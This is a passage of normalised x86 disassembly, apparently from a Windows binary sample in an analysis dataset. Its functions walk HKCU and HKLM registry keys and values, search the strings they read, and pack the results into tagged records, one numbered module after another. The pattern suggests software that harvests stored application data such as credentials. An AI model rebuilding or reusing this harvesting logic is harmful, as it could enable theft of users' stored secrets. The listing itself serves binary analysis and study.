je r-xdata
cmp [ ebp - 0x81c ] 0x0
je r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push 0xbeef0010
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0xc ]
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x820 ]
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x824 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x830 ]
push [ ebp + 0x8 ]
call sub_401548
sub_40d090
push ebp
mov ebp esp
add esp 0xffffffe4
lea eax [ ebp - 0x4 ]
push eax
push rw-data
push rw-data
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
leave
retn 0x8
push eax
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
call sub_401835
push [ eax ]
pop [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x1f4
jbe r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] 0x1f4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push [ ebp - 0x8 ]
push rw-data
lea eax [ ebp - 0x1c ]
push eax
call wsprintfA
add esp 0xc
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push rw-data
push [ ebp + 0xc ]
call sub_401cee
or eax eax
je r-xdata
dec [ ebp - 0x8 ]
push eax
push 0xbeef0001
push eax
push [ ebp + 0x8 ]
call sub_403e31
call sub_401835
sub_40d11f
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x47
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40ce37
push rw-data
push 0x80000002
push [ ebp + 0x8 ]
call sub_40ce37
push [ rw-data ]
push [ ebp + 0x8 ]
call sub_40d090
push 0x80000002
push [ ebp + 0x8 ]
call sub_40d090
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40d183
push ebp
mov ebp esp
add esp 0xffffffdc
push esi
push edi
push 0x0
push 0x48
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push rw-data
push 0x0
call [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub esi esi
mov edx [ esi + 0xc ]
mov ecx [ edx + 0x68 ]
mov edi [ edx + 0x6c ]
mov [ ebp - 0xc ] ecx
or edi edi
je r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
push 0x0
push [ ebp - 0x8 ]
call [ rw-data ]
push esi
push [ ebp - 0x8 ]
call [ rw-data ]
mov esi eax
or esi esi
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push rw-data
push [ edi ]
call lstrcmpA
or eax eax
jne r-xdata
add edi 0x10
dec [ ebp - 0xc ]
cmp [ edi + 0x8 ] 0x0
je r-xdata
push [ edi + 0x8 ]
call sub_40184c
mov [ ebp - 0x10 ] eax
push [ edi + 0x8 ]
push [ ebp - 0x10 ]
push [ edi + 0xc ]
call sub_401883
push rw-data
push [ ebp - 0x10 ]
call lstrcmpA
or eax eax
jne r-xdata
push [ ebp - 0x10 ]
call sub_401835
push 0x0
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
push esi
call [ rw-data ]
or eax eax
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x18 ]
push [ ebp - 0x14 ]
call [ rw-data ]
or eax eax
je r-xdata
push 0x0
push [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x0
push 0x7
push 0x0
push [ ebp - 0x1c ]
call [ rw-data ]
or eax eax
je r-xdata
push [ ebp - 0x1c ]
call [ rw-data ]
push [ ebp - 0x20 ]
call sub_40184c
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x20 ]
push eax
push [ ebp - 0x24 ]
push 0x0
push 0x7
push 0x0
push [ ebp - 0x1c ]
call [ rw-data ]
or eax eax
je r-xdata
push [ ebp - 0x24 ]
call sub_401835
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call sub_40151c
sub_40d385
push ebp
mov ebp esp
add esp 0xfffff7dc
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ rw-data ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0x8
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x824 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x824 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x810 ] eax
push 0x0
push rw-data
push [ ebp - 0x824 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x824 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x818 ] eax
push 0x0
push rw-data
push [ ebp - 0x824 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x824 ]
push [ rw-data ]
call sub_401cee
mov [ ebp - 0x820 ] eax
cmp [ ebp - 0x814 ] 0x0
je r-xdata
jmp r-xdata
push [ ebp - 0x824 ]
push [ ebp + 0x8 ]
call sub_40d385
push [ ebp - 0x824 ]
call sub_401835
push [ ebp - 0x810 ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x820 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
push 0xbeef0000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x810 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x814 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x81c ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x820 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
sub_40d55b
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x49
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40d385
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40d58c
push ebp
mov ebp esp
add esp 0xfffffff4
push [ ebp + 0xc ]
call lstrlenA
or eax eax
jne r-xdata
push [ ebp + 0x10 ]
call lstrlenA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
call sub_40184c
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
call sub_402616
or eax eax
je r-xdata
leave
retn 0xc
push [ ebp - 0x4 ]
call sub_401835
leave
retn 0xc
mov [ ebp - 0xc ] eax
push 0x0
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x4 ]
call sub_4041a1
or eax eax
je r-xdata
push 0xbeef1000
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_40151c
sub_40d619
push ebp
mov ebp esp
add esp 0xffffffd4
push esi
push [ ebp + 0xc ]
call sub_401eb3
or eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_401f7a
or eax eax
je r-xdata
pop esi
leave
retn 0xc
pop esi
leave
retn 0xc
push [ ebp - 0x4 ]
call sub_40184c
mov [ ebp - 0x14 ] eax
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call sub_401883
mov esi [ ebp - 0x14 ]
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push rw-data
push esi
call StrStrA
or eax eax
jne r-xdata
push [ ebp - 0x14 ]
call sub_401835
lea eax [ ebp - 0x10 ]
push eax
call sub_40200e
jmp r-xdata
mov esi eax
push rw-data
call lstrlenA
add esi eax
mov [ ebp - 0x18 ] esi
push rw-data
push esi
call StrStrA
or eax eax
jne r-xdata
jmp r-xdata
mov dl [ eax ]
mov [ ebp - 0x1d ] dl
mov [ ebp - 0x1c ] eax
push rw-data
push esi
call StrStrA
or eax eax
jne r-xdata
jmp r-xdata
mov esi eax
push rw-data
call lstrlenA
add esi eax
mov [ ebp - 0x24 ] esi
push rw-data
push esi
call StrStrA
or eax eax
jne r-xdata
jmp r-xdata
mov dl [ eax ]
mov [ ebp - 0x29 ] dl
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x1c ]
mov [ eax ] 0x0
mov eax [ ebp - 0x28 ]
mov [ eax ] 0x0
push [ ebp - 0x24 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_40d58c
mov dl [ ebp - 0x1d ]
mov eax [ ebp - 0x1c ]
mov [ eax ] dl
mov dl [ ebp - 0x29 ]
mov eax [ ebp - 0x28 ]
mov [ eax ] dl
jmp r-xdata
sub_40d72a
push ebp
mov ebp esp
push [ ebp + 0xc ]
call sub_401e2e
or eax eax
je r-xdata
leave
retn 0x8
push rw-data
push eax
call sub_401dc9
push eax
push sub_40d619
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_403f6b
call sub_401835
sub_40d766
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x4a
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x1a
push [ ebp + 0x8 ]
call sub_40d72a
push 0x23
push [ ebp + 0x8 ]
call sub_40d72a
push 0x1c
push [ ebp + 0x8 ]
call sub_40d72a
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40d7bf
push ebp
mov ebp esp
add esp 0xfffff7d8
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x828 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x810 ] eax
push 0x0
push rw-data
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x818 ] eax
lea eax [ ebp - 0x824 ]
push eax
push rw-data
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x820 ] eax
cmp [ ebp - 0x810 ] 0x0
je r-xdata
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_40d7bf
push [ ebp - 0x828 ]
call sub_401835
push [ ebp - 0x810 ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x820 ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
cmp [ ebp - 0x818 ] 0x0
je r-xdata
push 0xbeef0000
push [ ebp + 0x10 ]
call sub_4014e6
push [ ebp - 0x810 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x814 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x824 ]
push [ ebp - 0x81c ]
push [ ebp + 0x10 ]
call sub_40151c
push [ ebp - 0x820 ]
push [ ebp + 0x10 ]
call sub_401548
sub_40d9a3
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x4b
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
push rw-data
push [ rw-data ]
call sub_40d7bf
push [ ebp + 0x8 ]
push rw-data
push 0x80000002
call sub_40d7bf
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40d9ec
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x4c
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40da27
push ebp
mov ebp esp
add esp 0xfffff7d0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
push rw-data
push [ ebp + 0xc ]
call sub_401d75
push eax
mov edx eax
lea eax [ ebp - 0x80c ]
push eax
push edx
call sub_401d75
mov [ ebp - 0x828 ] eax
call sub_401835
push 0x0
push rw-data
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x810 ] eax
push 0x0
push rw-data
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x814 ] eax
push 0x0
push rw-data
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x818 ] eax
lea eax [ ebp - 0x824 ]
push eax
push rw-data
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x81c ] eax
push 0x0
push rw-data
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x820 ] eax
lea eax [ ebp - 0x830 ]
push eax
push rw-data
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x82c ] eax
cmp [ ebp - 0x810 ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x830 ] 0x0
je r-xdata
cmp [ ebp - 0x814 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
push [ ebp + 0x10 ]
push [ ebp - 0x828 ]
push [ ebp + 0x8 ]
call sub_40da27
push [ ebp - 0x828 ]
call sub_401835
push [ ebp - 0x810 ]
call sub_401835
push [ ebp - 0x814 ]
call sub_401835
push [ ebp - 0x818 ]
call sub_401835
push [ ebp - 0x81c ]
call sub_401835
push [ ebp - 0x820 ]
call sub_401835
push [ ebp - 0x82c ]
call sub_401835
inc [ ebp - 0x8 ]
jmp r-xdata
push 0xbeef0001
push [ ebp + 0x10 ]
call sub_4014e6
push [ ebp - 0x830 ]
push [ ebp - 0x82c ]
push [ ebp + 0x10 ]
call sub_40151c
cmp [ ebp - 0x818 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumKeyExA
or eax eax
je r-xdata
push 0xbeef0000
push [ ebp + 0x10 ]
call sub_4014e6
push [ ebp - 0x810 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x814 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x818 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x824 ]
push [ ebp - 0x81c ]
push [ ebp + 0x10 ]
call sub_40151c
push [ ebp - 0x820 ]
push [ ebp + 0x10 ]
call sub_401548
sub_40dc60
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x4d
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
push rw-data
push [ rw-data ]
call sub_40da27
push [ ebp + 0x8 ]
push rw-data
push 0x80000002
call sub_40da27
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40dca9
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x4e
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4023a8
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_40dd27
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x4f
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0x0
push rw-data
push rw-data
push [ rw-data ]
call sub_401cee
or eax eax
je r-xdata
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
sub_40dd96
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x50
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4023a8
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_40de14
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x51
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4023a8
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_40de92
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x52
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40bf02
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40dec3
push ebp
mov ebp esp
add esp 0xffffffe0
push esi
push [ ebp + 0xc ]
call sub_401eb3
or eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
call sub_401f7a
or eax eax
je r-xdata
pop esi
leave
retn 0x8
pop esi
leave
retn 0x8
push [ ebp - 0x4 ]
call sub_40184c
mov [ ebp - 0x14 ] eax
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call sub_401883
mov esi [ ebp - 0x14 ]
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push rw-data
push esi
call StrStrA
or eax eax
jne r-xdata
push 0xbeef0002
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
push [ ebp + 0x8 ]
call sub_40151c
push [ ebp - 0x14 ]
call sub_401835
lea eax [ ebp - 0x10 ]
push eax
call sub_40200e
jmp r-xdata
mov esi eax
push rw-data
call lstrlenA
add esi eax
mov [ ebp - 0x18 ] esi
push rw-data
push esi
call StrStrA
or eax eax
jne r-xdata
jmp r-xdata
mov dl [ eax ]
mov [ eax ] 0x0
push eax
push edx
push [ ebp - 0x18 ]
call lstrlenA
or eax eax
je r-xdata
jmp r-xdata
pop edx
pop eax
mov [ eax ] dl
mov [ ebp - 0x1c ] eax
push [ ebp - 0x18 ]
call sub_40299a
mov [ ebp - 0x20 ] eax
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_402a8a
or eax eax
je r-xdata
push [ ebp - 0x20 ]
call sub_401835
shr [ ebp - 0x1c ] 0x1
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x20 ]
call sub_4041a1
or eax eax
je r-xdata
push 0xbeef0001
push [ ebp + 0x8 ]
call sub_4014e6
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_401548
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp + 0x8 ]
call sub_40151c
sub_40dffc
push ebp
mov ebp esp
add esp 0xffffffe4
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
push 0x0
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x8 ] eax
push 0x0
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1c ]
push eax
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x10 ] eax
push 0x0
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x14 ] eax
push 0x0
push rw-data
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401cee
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push [ ebp - 0x8 ]
call sub_401835
push [ ebp - 0xc ]
call sub_401835
push [ ebp - 0x10 ]
call sub_401835
push [ ebp - 0x14 ]
call sub_401835
push [ ebp - 0x18 ]
call sub_401835
push [ ebp - 0x4 ]
call RegCloseKey
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push [ ebp - 0x1c ]
push [ ebp - 0x10 ]
call sub_402a8a
or eax eax
je r-xdata
shr [ ebp - 0x1c ] 0x1
push 0x0
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
call sub_4041a1
or eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push 0xbeef0000
push [ ebp + 0x10 ]
call sub_4014e6
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x1c ]
push [ ebp - 0x10 ]
push [ ebp + 0x10 ]
call sub_40151c
push [ ebp - 0x14 ]
push [ ebp + 0x10 ]
call sub_401548
push [ ebp - 0x18 ]
push [ ebp + 0x10 ]
call sub_401548
sub_40e145
push ebp
mov ebp esp
add esp 0xfffff7e8
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call RegOpenKeyA
or eax eax
jne r-xdata
leave
retn 0xc
mov [ ebp - 0x8 ] 0x0
cmp [ ebp - 0x814 ] 0x1
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x818 ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_401cee
or eax eax
je r-xdata
inc [ ebp - 0x8 ]
jmp r-xdata
push [ ebp - 0x4 ]
call RegCloseKey
inc [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x810 ] eax
push rw-data
push [ ebp - 0x810 ]
call StrStrIA
or eax eax
je r-xdata
mov [ ebp - 0xc ] 0x7ff
push 0x0
push 0x0
lea eax [ ebp - 0x814 ]
push eax
push 0x0
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x80c ]
push eax
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call RegEnumValueA
or eax eax
je r-xdata
push [ ebp - 0x810 ]
call sub_401835
push [ ebp - 0x810 ]
push [ ebp + 0x10 ]
call sub_40dec3
sub_40e20e
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x53
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push [ ebp + 0x8 ]
push rw-data
push [ rw-data ]
call sub_40dffc
push [ ebp + 0x8 ]
push rw-data
push 0x80000002
call sub_40dffc
push [ ebp + 0x8 ]
push rw-data
push [ rw-data ]
call sub_40e145
push [ ebp + 0x8 ]
push rw-data
push 0x80000002
call sub_40e145
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40e27c
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x54
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40bf02
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40e2ad
push ebp
mov ebp esp
add esp 0xfffffffc
push esi
push edi
push 0x0
push 0x55
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov edi [ rw-data ]
cmp [ edi ] 0x0
je r-xdata
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
pop edi
pop esi
leave
retn 0x4
push rw-data
push edi
call StrStrIA
or eax eax
je r-xdata
jmp r-xdata
push esi
call sub_4023a8
push eax
push 0xbeef0000
push rw-data
push eax
push [ ebp + 0x8 ]
call sub_404116
call sub_401835
cmp [ esi ] 0x0
jne r-xdata
inc esi
inc esi
cld
xor eax eax
mov ecx 0xffffffff
[ edi ]
cmp [ edi ] al
jne r-xdata
sub_40e32b
push ebp
mov ebp esp
add esp 0xfffffff8
cmp [ rw-data ] 0x0
jne r-xdata
push 0x105
call sub_40184c
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] 0x104
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push [ ebp + 0xc ]
call [ rw-data ]
push [ ebp - 0x4 ]
call lstrlenA
cmp eax 0x3
jbe r-xdata
leave
retn 0x8
push [ ebp - 0x4 ]
call sub_401835
leave
retn 0x8
push 0xbeef0000
push rw-data
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_404116
sub_40e393
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x56
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push rw-data
push [ ebp + 0x8 ]
call sub_40e32b
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40e3c4
push ebp
mov ebp esp
add esp 0xfffffffc
push 0x0
push 0x57
push [ ebp + 0x8 ]
call sub_40156d
mov [ ebp - 0x4 ] eax
push 0xbeef0000
push rw-data
push rw-data
push [ ebp + 0x8 ]
call sub_404161
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_4015b3
leave
retn 0x4
sub_40e3ff
push ebp
